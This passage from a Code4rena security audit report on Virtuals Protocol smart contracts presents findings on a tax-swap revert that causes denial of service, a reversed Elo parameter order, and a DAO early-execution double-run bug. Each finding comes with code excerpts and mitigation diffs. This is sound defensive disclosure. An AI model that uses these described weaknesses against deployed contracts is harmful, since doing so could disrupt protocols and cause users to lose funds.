<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">swap</span><span class="mtk1">(</span><span class="mtk12">amountIn</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk12">amountOut</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">feeTo</span><span class="mtk1"> == </span><span class="mtk12">taxManager</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">IBondingTax</span><span class="mtk1">(</span><span class="mtk12">taxManager</span><span class="mtk1">).</span><span class="mtk11">swapForAsset</span><span class="mtk1">();         &lt;&lt;@ -- </span><span class="mtk3">// Swap for Asset call</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> (</span><span class="mtk12">amountIn</span><span class="mtk1">, </span><span class="mtk12">amountOut</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>However, when we have a closer look at the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L122"><code>BondingTax::swapForAsset</code></a> function, we can observe that it reverts if the balance of the contract is 0:</p>
<pre data-index="91" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// BondingTax.sol</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">swapForAsset</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">onlyBondingRouter</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1"> = </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">taxToken</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">amount</span><span class="mtk1"> &gt; </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk8">"Nothing to be swapped"</span><span class="mtk1">);       &lt;&lt;@ -- </span><span class="mtk3">// Reverts if balance is 0</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">amount</span><span class="mtk1"> &lt; </span><span class="mtk12">minSwapThreshold</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">return</span><span class="mtk1"> (</span><span class="mtk4">false</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">amount</span><span class="mtk1"> &gt; </span><span class="mtk12">maxSwapThreshold</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">amount</span><span class="mtk1"> = </span><span class="mtk12">maxSwapThreshold</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span></code></pre>
<p>Hence, if buy and/or sell tax is set to 0 via <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FFactory.sol#L74"><code>FFactory::setTaxParams</code></a>, there can be a case where the balance of <code>taxManager</code> becomes 0. </p>
<p>Also this is not unlikely, and can be very easily manipulated by an attacker by simply donating exactly to match <code>maxSwapThreshold</code> funds. Setting fees to 0 is a very valid and intuitive value to set.</p>
<h3 style="position:relative;" id="impact-13"><a class="anchor before" aria-label="impact 13 permalink" href="#impact-13"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Failed buy and sell swaps will lead to DoS.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-19"><a class="anchor before" aria-label="recommended mitigation steps 19 permalink" href="#recommended-mitigation-steps-19"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>It is recommended to simply return with <code>(false, 0)</code> instead of reverting:</p>
<pre data-index="92" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    // BondingTax.sol</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    function swapForAsset() public onlyBondingRouter returns (bool, uint256) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256 amount = IERC20(taxToken).balanceOf(address(this));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">-        require(amount &gt; 0, "Nothing to be swapped");</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">-        if (amount &lt; minSwapThreshold) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+        if (amount &lt; minSwapThreshold || amount == 0) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            return (false, 0);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        if (amount &gt; maxSwapThreshold) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            amount = maxSwapThreshold;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span></code></pre>
<hr>
<h2 style="position:relative;" id="m-16-elo-calculation-error"><a class="anchor before" aria-label="m 16 elo calculation error permalink" href="#m-16-elo-calculation-error"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-71">[M-16] <code>Elo</code> calculation error</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-447">levi_104</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-809">axelot</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-13">gmh5225</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-382">io10</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/EloCalculator.sol#L39-L55">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/EloCalculator.sol#L39-L55</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-3"><a class="anchor before" aria-label="finding description and impact 3 permalink" href="#finding-description-and-impact-3"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>Here, the order of <code>eloB</code> and <code>eloA</code> is reversed, and subsequently, <code>eloA</code> and <code>eloB</code> are calculated with addition and subtraction based on the value of <code>negative</code>, leading to a final calculation error.</p>
<pre data-index="93" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">battleElo</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">currentRating</span><span class="mtk1">, </span><span class="mtk12">uint8</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">battles</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">eloA</span><span class="mtk1"> = </span><span class="mtk7">1000</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">eloB</span><span class="mtk1"> = </span><span class="mtk7">1000</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">battles</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">result</span><span class="mtk1"> = </span><span class="mtk11">mapBattleResultToGameResult</span><span class="mtk1">(</span><span class="mtk12">battles</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">change</span><span class="mtk1">, </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">negative</span><span class="mtk1">) = </span><span class="mtk12">Elo</span><span class="mtk1">.</span><span class="mtk11">ratingChange</span><span class="mtk1">(</span><span class="mtk12">eloB</span><span class="mtk1">, </span><span class="mtk12">eloA</span><span class="mtk1">, </span><span class="mtk12">result</span><span class="mtk1">, </span><span class="mtk12">k</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">change</span><span class="mtk1"> = </span><span class="mtk11">_roundUp</span><span class="mtk1">(</span><span class="mtk12">change</span><span class="mtk1">, </span><span class="mtk7">100</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">negative</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">eloA</span><span class="mtk1"> -= </span><span class="mtk12">change</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">eloB</span><span class="mtk1"> += </span><span class="mtk12">change</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            } </span><span class="mtk15">else</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">eloA</span><span class="mtk1"> += </span><span class="mtk12">change</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">eloB</span><span class="mtk1"> -= </span><span class="mtk12">change</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">currentRating</span><span class="mtk1"> + </span><span class="mtk12">eloA</span><span class="mtk1"> - </span><span class="mtk7">1000</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>In the ELO system:</p>
<ul>
<li><code>ratingA</code> usually represents Player A’s rating, and score is Player A’s score.</li>
<li><code>ratingB</code> is the opponent (Player B)’s rating.</li>
</ul>
<p>But in this code:</p>
<ul>
<li><code>eloA</code> is regarded as Player A’s rating.</li>
<li><code>eloB</code> is regarded as Player B’s rating.</li>
</ul>
<p>However, when calling <code>Elo.ratingChange(eloB, eloA, result, k)</code>, it means:</p>
<ul>
<li><code>ratingA = eloB</code> (Player B’s rating).</li>
<li><code>ratingB = eloA</code> (Player A’s rating).</li>
<li>score is the score of <code>ratingA</code> (<code>eloB</code>).</li>
</ul>
<p>This is unexpected. Usually, <code>Elo.ratingChange(eloA, eloB, result, k)</code> should be used, because:</p>
<ul>
<li><code>eloA</code> is Player A’s rating, and result is Player A’s battle outcome.</li>
<li><code>eloB</code> is Player B’s rating.</li>
</ul>
<p>Due to the wrong parameter order, <code>Elo.ratingChange</code> calculates the change and direction of <code>eloB</code> (as <code>ratingA</code>), not of <code>eloA</code>.</p>
<pre data-index="94" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">/// @notice Calculates the change in ELO rating, after a given outcome.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">/// @param ratingA the ELO rating of the player A</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">/// @param ratingB the ELO rating of the player B</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">/// @param score the score of the player A, scaled by 100. 100 = win, 50 = draw, 0 = loss</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">/// @param kFactor the k-factor or development multiplier used to calculate the change in ELO rating. 20 is the typical value</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">/// @return change the change in ELO rating of player A, with 2 decimals of precision. 1501 = 15.01 ELO change</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">/// @return negative the directional change of player A's ELO. Opposite sign for player B</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">ratingChange</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">ratingA</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">ratingB</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">score</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">kFactor</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">pure</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">change</span><span class="mtk1">, </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">negative</span><span class="mtk1">) {</span></span></span></code></pre>
<h3 style="position:relative;" id="recommended-mitigation-steps-20"><a class="anchor before" aria-label="recommended mitigation steps 20 permalink" href="#recommended-mitigation-steps-20"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<pre data-index="95" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">- </span><span class="mtk12">Elo</span><span class="mtk1">.</span><span class="mtk11">ratingChange</span><span class="mtk1">(</span><span class="mtk12">eloB</span><span class="mtk1">, </span><span class="mtk12">eloA</span><span class="mtk1">, </span><span class="mtk12">result</span><span class="mtk1">, </span><span class="mtk12">k</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">+ </span><span class="mtk12">Elo</span><span class="mtk1">.</span><span class="mtk11">ratingChange</span><span class="mtk1">(</span><span class="mtk12">eloA</span><span class="mtk1">, </span><span class="mtk12">eloB</span><span class="mtk1">, </span><span class="mtk12">result</span><span class="mtk1">, </span><span class="mtk12">k</span><span class="mtk1">);</span></span></span></code></pre>
<hr>
<h2 style="position:relative;" id="m-17-virtualgenesisdaosolearlyexecute-proposals-can-be-executed-two-times"><a class="anchor before" aria-label="m 17 virtualgenesisdaosolearlyexecute proposals can be executed two times permalink" href="#m-17-virtualgenesisdaosolearlyexecute-proposals-can-be-executed-two-times"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-90">[M-17] <code>VirtualGenesisDAO.sol:earlyExecute()</code> proposals can be executed two times</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-595">Fitro</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/governance/VirtualGenesisDAO.sol#L95-L118">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/governance/VirtualGenesisDAO.sol#L95-L118</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-4"><a class="anchor before" aria-label="finding description and impact 4 permalink" href="#finding-description-and-impact-4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p><code>earlyExecute()</code> allows a proposal to be executed earlier but can only be called by an account with the <code>EXECUTOR_ROLE</code>.</p>
<pre data-index="96" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">earlyExecute</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">payable</span><span class="mtk1"> </span><span class="mtk11">onlyRole</span><span class="mtk1">(</span><span class="mtk12">EXECUTOR_ROLE</span><span class="mtk1">) </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        (</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">targets</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">values</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">bytes</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">calldatas</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">bytes32</span><span class="mtk1"> </span><span class="mtk12">descriptionHash</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ) = </span><span class="mtk11">proposalDetails</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">state</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">) == </span><span class="mtk12">ProposalState</span><span class="mtk1">.</span><span class="mtk12">Active</span><span class="mtk1"> &amp;&amp;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk11">_voteSucceeded</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">) &amp;&amp;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk11">_quorumReached</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">) &amp;&amp;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                !</span><span class="mtk12">_earlyExecutions</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">],</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">"Proposal not ready for early execution"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// avoid reentrancy</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_earlyExecutions</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">] = </span><span class="mtk4">true</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_executeOperations</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">, </span><span class="mtk12">targets</span><span class="mtk1">, </span><span class="mtk12">values</span><span class="mtk1">, </span><span class="mtk12">calldatas</span><span class="mtk1">, </span><span class="mtk12">descriptionHash</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">ProposalExecuted</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>As you can see, it uses the <code>_earlyExecutions</code> mapping to prevent the proposal from being executed a second time. The problem is that <code>_executeOperations()</code> does not set the <code>executed</code> flag to <code>true</code>, as can be seen in the <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/08566bfe0d19384af30a70815251fa913a19678b/contracts/governance/Governor.sol#L431-L433">comments</a> of the function.</p>
<pre data-index="97" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">/**</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">* NOTE: Calling this function directly will NOT check the current state of the proposal, set the executed flag to</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">* true or emit the </span><span class="mtk8">`ProposalExecuted`</span><span class="mtk3"> event. Executing a proposal should be done using {execute} or {_execute}.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">*/</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_executeOperations</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk3">/* proposalId */</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">targets</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">values</span><span class="mtk1">,</span></span></span>
